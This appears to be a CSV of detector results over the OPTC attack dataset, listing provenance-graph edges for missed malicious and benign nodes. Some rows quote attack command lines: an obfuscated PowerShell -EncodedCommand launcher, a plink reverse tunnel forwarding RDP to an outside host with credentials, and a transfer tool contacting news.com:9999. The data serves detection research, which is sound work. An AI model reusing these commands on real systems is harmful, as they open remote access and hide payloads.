node_group,node_group_label,operation,type_pair,target_role,src_label,dst_label,attack,short_attack,endpoint_pair,short_endpoint_pair,count,fraction
TN_high_below_threshold,Top 500 benign nodes just below threshold,DELETE,subject->file,dst,"subject: /Device/HarddiskVolume1/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe | ""C:/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe"" ",file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/ArmUI.ini,benign,benign,"subject: /Device/HarddiskVolume1/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe | ""C:/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe""  -> file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/ArmUI.ini",1.0/AdobeARM.exe --> Temp/ArmUI.ini,1,0.002000000
TN_high_below_threshold,Top 500 benign nodes just below threshold,DELETE,subject->file,src,"subject: /Device/HarddiskVolume1/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe | ""C:/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe"" ",file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/ArmUI.ini,benign,benign,"subject: /Device/HarddiskVolume1/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe | ""C:/Program Files (x86)/Common Files/Adobe/ARM/1.0/AdobeARM.exe""  -> file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/ArmUI.ini",1.0/AdobeARM.exe --> Temp/ArmUI.ini,1,0.002000000
FN_below_threshold,FN: malicious below threshold,DELETE,subject->file,src,subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe,file: /Device/HarddiskVolume1/ProgramData/MICROSOFT/GROUP POLICY/HISTORY/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/MACHINE/PREFERENCES/SCHEDULEDTASKS/SCHEDULEDTASKS.XML,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe -> file: /Device/HarddiskVolume1/ProgramData/MICROSOFT/GROUP POLICY/HISTORY/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/MACHINE/PREFERENCES/SCHEDULEDTASKS/SCHEDULEDTASKS.XML,system32/svchost.exe --> SCHEDULEDTASKS/SCHEDULEDTASKS.XML,1,0.001336898
FN_below_threshold,FN: malicious below threshold,DELETE,subject->file,src,"subject: /Device/HarddiskVolume1/Windows/system32/lsass.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """"",file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Word/~WRS{1D8489CA-4376-4331-B548-C948EA8D246D}.tmp,OPTC h501 attack,Attack 0,"subject: /Device/HarddiskVolume1/Windows/system32/lsass.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """" -> file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Word/~WRS{1D8489CA-4376-4331-B548-C948EA8D246D}.tmp",system32/lsass.exe --> Content.Word/~WRS{1D8489CA-4376-4331-B548-C948EA8D246D}.tmp,1,0.001336898
FN_below_threshold,FN: malicious below threshold,DELETE,subject->file,src,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/__PSScriptPolicyTest_r1evkga3.y1b.ps1,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -> file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/__PSScriptPolicyTest_r1evkga3.y1b.ps1,v1.0/powershell.exe --> Temp/__PSScriptPolicyTest_r1evkga3.y1b.ps1,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MODIFY,subject->file,src,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | C:/Windows/System32/svchost.exe -k utcsvc,file: /Device/HarddiskVolume1/ProgramData/Microsoft/Diagnosis/VortexSchemaRequests.dat,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | C:/Windows/System32/svchost.exe -k utcsvc -> file: /Device/HarddiskVolume1/ProgramData/Microsoft/Diagnosis/VortexSchemaRequests.dat,System32/svchost.exe --> Diagnosis/VortexSchemaRequests.dat,1,0.001336898
FN_below_threshold,FN: malicious below threshold,DELETE,subject->file,dst,subject: /Device/HarddiskVolume1/Windows/Explorer.EXE,file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/Explorer.EXE -> file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,Windows/Explorer.EXE --> Downloads/fileTransfer1000.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,DELETE,subject->file,src,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,file: /Device/HarddiskVolume1/Windows/Temp/__PSScriptPolicyTest_44leejym.z5z.ps1,OPTC h501 attack,Attack 0,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB -> file: /Device/HarddiskVolume1/Windows/Temp/__PSScriptPolicyTest_44leejym.z5z.ps1,powershell.exe --> Temp/__PSScriptPolicyTest_44leejym.z5z.ps1,1,0.001336898
FN_below_threshold,FN: malicious below threshold,DELETE,subject->file,src,subject: powershell.exe,file: /Device/HarddiskVolume1/Users/administrator.SYSTEMIACOM/AppData/Local/Temp/__PSScriptPolicyTest_2l2pm5jh.ca2.psm1,OPTC h501 attack,Attack 0,subject: powershell.exe -> file: /Device/HarddiskVolume1/Users/administrator.SYSTEMIACOM/AppData/Local/Temp/__PSScriptPolicyTest_2l2pm5jh.ca2.psm1,powershell.exe --> Temp/__PSScriptPolicyTest_2l2pm5jh.ca2.psm1,1,0.001336898
FN_below_threshold,FN: malicious below threshold,CREATE,subject->subject,dst,subject: System,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | /SystemRoot/System32/smss.exe,OPTC h501 attack,Attack 0,subject: System -> subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | /SystemRoot/System32/smss.exe,System --> System32/svchost.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,WRITE,subject->file,dst,subject: powershell.exe,file: /Device/HarddiskVolume1/Windows/system32/plink.exe,OPTC h501 attack,Attack 0,subject: powershell.exe -> file: /Device/HarddiskVolume1/Windows/system32/plink.exe,powershell.exe --> system32/plink.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,CREATE,subject->subject,dst,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | /SystemRoot/System32/smss.exe 000000e8 00000080 ,"subject: %SystemRoot%/system32/csrss.exe | %SystemRoot%/system32/csrss.exe ObjectDirectory=/Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",OPTC h501 attack,Attack 0,"subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | /SystemRoot/System32/smss.exe 000000e8 00000080  -> subject: %SystemRoot%/system32/csrss.exe | %SystemRoot%/system32/csrss.exe ObjectDirectory=/Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",System32/svchost.exe --> %SystemRoot%/system32/csrss.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,WRITE,subject->file,src,"subject: /Device/HarddiskVolume1/Windows/system32/plink.exe | ""C:/Windows/system32/plink.exe"" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest",file: /Device/HarddiskVolume1/Users/administrator.SYSTEMIACOM/AppData/Local/PUTTY.RND,OPTC h501 attack,Attack 0,"subject: /Device/HarddiskVolume1/Windows/system32/plink.exe | ""C:/Windows/system32/plink.exe"" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest -> file: /Device/HarddiskVolume1/Users/administrator.SYSTEMIACOM/AppData/Local/PUTTY.RND",system32/plink.exe --> Local/PUTTY.RND,1,0.001336898
FN_below_threshold,FN: malicious below threshold,RENAME,subject->file,src,subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe,node 70937,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe -> node 70937,system32/svchost.exe --> node 70937,1,0.001336898
FN_below_threshold,FN: malicious below threshold,TERMINATE,subject->subject,src,"subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" --help","subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" --help",OPTC h501 attack,Attack 0,"subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" --help -> subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" --help",Downloads/fileTransfer1000.exe --> Downloads/fileTransfer1000.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,TERMINATE,subject->subject,src,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe -> subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe,Downloads/fileTransfer1000.exe --> Downloads/fileTransfer1000.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,OPEN,subject->subject,src,"subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe""","subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe""",OPTC h501 attack,Attack 0,"subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" -> subject: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe | ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe""",Downloads/fileTransfer1000.exe --> Downloads/fileTransfer1000.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,CREATE,subject->file,dst,subject: /Device/HarddiskVolume1/Windows/Explorer.EXE,file: /Device/HarddiskVolume1/Users/sysadmin/AppData/Roaming/Microsoft/Windows/Recent/export.zip.lnk,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/Explorer.EXE -> file: /Device/HarddiskVolume1/Users/sysadmin/AppData/Roaming/Microsoft/Windows/Recent/export.zip.lnk,Windows/Explorer.EXE --> Recent/export.zip.lnk,1,0.001336898
FN_below_threshold,FN: malicious below threshold,TERMINATE,subject->subject,src,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe -> subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe,System32/mobsync.exe --> System32/mobsync.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,OPEN,subject->subject,src,subject: /Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe,subject: /Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe -> subject: /Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe,system32/SearchProtocolHost.exe --> system32/SearchProtocolHost.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,OPEN,subject->subject,src,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe | C:/Windows/System32/mobsync.exe -Embedding,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe | C:/Windows/System32/mobsync.exe -Embedding,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe | C:/Windows/System32/mobsync.exe -Embedding -> subject: /Device/HarddiskVolume1/Windows/System32/mobsync.exe | C:/Windows/System32/mobsync.exe -Embedding,System32/mobsync.exe --> System32/mobsync.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,WRITE,subject->file,src,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,file: /Device/HarddiskVolume1/ProgramData/Microsoft/Storage Health/StorageEventsArchive.dat,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe -> file: /Device/HarddiskVolume1/ProgramData/Microsoft/Storage Health/StorageEventsArchive.dat,System32/svchost.exe --> Storage Health/StorageEventsArchive.dat,1,0.001336898
FN_below_threshold,FN: malicious below threshold,OPEN,subject->subject,src,subject: /SystemRoot/System32/smss.exe | fileTransfer1000.exe  news.com 9999 ,subject: /SystemRoot/System32/smss.exe | fileTransfer1000.exe  news.com 9999 ,OPTC h501 attack,Attack 0,subject: /SystemRoot/System32/smss.exe | fileTransfer1000.exe  news.com 9999  -> subject: /SystemRoot/System32/smss.exe | fileTransfer1000.exe  news.com 9999 ,System32/smss.exe --> System32/smss.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MODIFY,subject->file,dst,subject: /Device/HarddiskVolume1/Program Files (x86)/Microsoft Office/Office15/OUTLOOK.EXE,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Program Files (x86)/Microsoft Office/Office15/OUTLOOK.EXE -> file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx,Office15/OUTLOOK.EXE --> H777GZPT/payroll.docx,1,0.001336898
FN_below_threshold,FN: malicious below threshold,RENAME,subject->file,dst,subject: /Device/HarddiskVolume1/Windows/Explorer.EXE,file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/export.zip,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/Explorer.EXE -> file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/export.zip,Windows/Explorer.EXE --> Downloads/export.zip,1,0.001336898
FN_below_threshold,FN: malicious below threshold,CREATE,subject->file,dst,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Chrome/Application/chrome.exe,file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe:Zone.Identifier,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Chrome/Application/chrome.exe -> file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe:Zone.Identifier,Application/chrome.exe --> Downloads/fileTransfer1000.exe:Zone.Identifier,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MODIFY,subject->file,dst,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Chrome/Application/chrome.exe,file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe:Zone.Identifier,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Program Files (x86)/Google/Chrome/Application/chrome.exe -> file: /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe:Zone.Identifier,Application/chrome.exe --> Downloads/fileTransfer1000.exe:Zone.Identifier,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MODIFY,subject->file,dst,subject: /Device/HarddiskVolume1/Program Files (x86)/Microsoft Office/Office15/OUTLOOK.EXE,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx:Zone.Identifier,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Program Files (x86)/Microsoft Office/Office15/OUTLOOK.EXE -> file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx:Zone.Identifier,Office15/OUTLOOK.EXE --> H777GZPT/payroll.docx:Zone.Identifier,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MODIFY,subject->file,dst,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,file: /Device/HarddiskVolume1/Windows/SysWOW64/kernelbase.dll,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe -> file: /Device/HarddiskVolume1/Windows/SysWOW64/kernelbase.dll,System32/svchost.exe --> SysWOW64/kernelbase.dll,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MODIFY,subject->file,dst,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,file: /Device/HarddiskVolume1/windows/system32/mobsync.exe,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe -> file: /Device/HarddiskVolume1/windows/system32/mobsync.exe,System32/svchost.exe --> system32/mobsync.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MODIFY,subject->file,dst,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,file: /Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{37412A2E-7EDB-406E-ABD8-FA6E1FEA5326}/MACHINE,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe -> file: /Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{37412A2E-7EDB-406E-ABD8-FA6E1FEA5326}/MACHINE,System32/svchost.exe --> {37412A2E-7EDB-406E-ABD8-FA6E1FEA5326}/MACHINE,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MODIFY,subject->file,dst,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,file: /Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{46A9A8CB-E14C-4589-8465-35231C3587DD}/MACHINE,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe -> file: /Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{46A9A8CB-E14C-4589-8465-35231C3587DD}/MACHINE,System32/svchost.exe --> {46A9A8CB-E14C-4589-8465-35231C3587DD}/MACHINE,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MODIFY,subject->file,dst,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe,file: /Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/MACHINE,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe -> file: /Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/MACHINE,System32/svchost.exe --> {59DE43A4-654B-4EB0-9D75-F2F66068034B}/MACHINE,1,0.001336898
FN_below_threshold,FN: malicious below threshold,START,subject->netflow,dst,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53278->202.6.172.98:443,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -> netflow 142.20.57.246:53278->202.6.172.98:443,v1.0/powershell.exe --> netflow 142.20.57.246:53278->202.6.172.98:443,1,0.001336898
FN_below_threshold,FN: malicious below threshold,START,subject->netflow,dst,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53277->202.6.172.98:443,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -> netflow 142.20.57.246:53277->202.6.172.98:443,v1.0/powershell.exe --> netflow 142.20.57.246:53277->202.6.172.98:443,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,subject->netflow,dst,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53275->202.6.172.98:443,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -> netflow 142.20.57.246:53275->202.6.172.98:443,v1.0/powershell.exe --> netflow 142.20.57.246:53275->202.6.172.98:443,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,subject->netflow,dst,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53274->202.6.172.98:443,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -> netflow 142.20.57.246:53274->202.6.172.98:443,v1.0/powershell.exe --> netflow 142.20.57.246:53274->202.6.172.98:443,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,subject->netflow,dst,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53268->202.6.172.98:443,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -> netflow 142.20.57.246:53268->202.6.172.98:443,v1.0/powershell.exe --> netflow 142.20.57.246:53268->202.6.172.98:443,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,subject->netflow,dst,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53266->202.6.172.98:443,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -> netflow 142.20.57.246:53266->202.6.172.98:443,v1.0/powershell.exe --> netflow 142.20.57.246:53266->202.6.172.98:443,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,subject->netflow,dst,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53265->202.6.172.98:443,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -> netflow 142.20.57.246:53265->202.6.172.98:443,v1.0/powershell.exe --> netflow 142.20.57.246:53265->202.6.172.98:443,1,0.001336898
FN_below_threshold,FN: malicious below threshold,START,subject->netflow,dst,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53255->202.6.172.98:443,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -> netflow 142.20.57.246:53255->202.6.172.98:443,v1.0/powershell.exe --> netflow 142.20.57.246:53255->202.6.172.98:443,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,subject->netflow,dst,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53250->202.6.172.98:443,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -> netflow 142.20.57.246:53250->202.6.172.98:443,v1.0/powershell.exe --> netflow 142.20.57.246:53250->202.6.172.98:443,1,0.001336898
FN_below_threshold,FN: malicious below threshold,START,subject->netflow,dst,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53249->202.6.172.98:443,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -> netflow 142.20.57.246:53249->202.6.172.98:443,v1.0/powershell.exe --> netflow 142.20.57.246:53249->202.6.172.98:443,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,subject->netflow,dst,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:53125->202.6.172.98:443,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -> netflow 142.20.57.246:53125->202.6.172.98:443,v1.0/powershell.exe --> netflow 142.20.57.246:53125->202.6.172.98:443,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,subject->netflow,dst,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 142.20.57.246:52442->202.6.172.98:443,OPTC h501 attack,Attack 0,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -> netflow 142.20.57.246:52442->202.6.172.98:443,v1.0/powershell.exe --> netflow 142.20.57.246:52442->202.6.172.98:443,1,0.001336898
